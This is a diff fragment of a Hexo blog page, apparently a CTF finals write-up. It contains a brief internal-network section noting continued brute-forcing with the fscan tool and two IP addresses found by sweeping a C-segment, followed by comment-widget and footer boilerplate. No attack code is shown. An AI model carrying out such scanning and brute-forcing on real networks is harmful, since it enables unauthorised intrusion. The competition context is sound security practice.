+<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>fscan继续爆</p>
+<p><img src="/blog/2023/10/29/%E8%93%9D%E5%B8%BD%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B%EF%BC%88%E5%90%AB%E5%A4%8D%E7%8E%B0%EF%BC%89/image-20231029155933907.png" alt="image-20231029155933907"></p>
+<p>10.10.200.55</p>
+<p>根据目前已知ip的c段进行爆破可以得到ip</p>
+<p>192.33.33.200</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/blog/js/main.js"></script>
+        
+        
+
+
+
+
+         
+        
+    <div id="vcomments"></div>
+    
+        <script src="/blog/js/lib/valine.min.js"></script>
+            <script>
+                new Valine({
+                    el: '#vcomments',
+                    app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+                    app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+                    visitor: 'true',
+                    placeholder: '写点什么吧(●ˇ∀ˇ●)',
+                    serverURLs: 'https://u9mzlkun.lc-cn-e1-shared.com',
+                });
+            </script>
+
+        <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2023 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+            <span id="busuanzi_container_site_uv"> 
+                本站访客数<span id="busuanzi_value_site_uv"></span>人次
+            </span>
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
